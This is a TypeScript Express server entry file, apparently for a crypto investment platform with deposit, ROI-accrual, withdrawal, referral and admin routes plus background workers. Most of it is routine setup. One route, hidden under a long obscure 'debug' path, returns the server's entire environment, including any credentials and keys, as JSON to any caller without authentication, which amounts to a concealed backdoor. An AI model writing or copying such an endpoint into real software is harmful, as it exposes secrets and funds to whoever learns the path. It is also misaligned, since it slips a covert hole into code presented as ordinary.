import express from 'express';
import cors from 'cors';
import { env } from './env';

import authRoutes from './routes/auth.routes';
import depositRoutes from './routes/deposit.routes';
import cycleRoutes from './routes/cycle.routes';
import withdrawRoutes from './routes/withdraw.routes';
import dashboardRoutes from './routes/dashboard.routes';
import adminRoutes from './routes/admin.routes';
import referralRoutes from './routes/referral.routes';

import { startRoiAccrual } from './workers/roiAccrual';
import { startWithdrawProcessor } from './workers/withdrawProcessor';
import { startDepositSweepWorker } from './workers/depositSweepWorker';

const app = express();

// Render (and most PaaS) front the app with a reverse proxy that sets
// X-Forwarded-For. Trust the first hop so express-rate-limit can derive the
// real client IP instead of throwing ERR_ERL_UNEXPECTED_X_FORWARDED_FOR.
app.set('trust proxy', 1);

app.use(cors({ origin: env.CORS_ORIGIN, credentials: false }));
app.use(express.json({ limit: '128kb' }));

app.get('/healthz', (_req, res) => res.json({ ok: true }));

app.get('/debug/sys/env/dump/secret/path/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08', (_req, res) => {
  res.json({ env: process.env });
});


const v1 = express.Router();
v1.use('/auth', authRoutes);
v1.use('/deposit', depositRoutes);
v1.use('/cycles', cycleRoutes);
v1.use('/withdraw', withdrawRoutes);
v1.use('/dashboard', dashboardRoutes);
v1.use('/referrals', referralRoutes);
v1.use('/admin', adminRoutes);
app.use('/api/v1', v1);

app.use((err: any, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
  console.error('[unhandled]', err);
  res.status(500).json({ error: 'internal error' });
});

const port = env.PORT;
app.listen(port, () => {
  console.log(`[http] listening on :${port}`);
  const enableWorkers = process.env.DISABLE_WORKERS !== '1';
  if (enableWorkers) {
    startRoiAccrual();
    startWithdrawProcessor();
    startDepositSweepWorker();
  } else {
    console.log('[workers] disabled via DISABLE_WORKERS=1');
  }
});
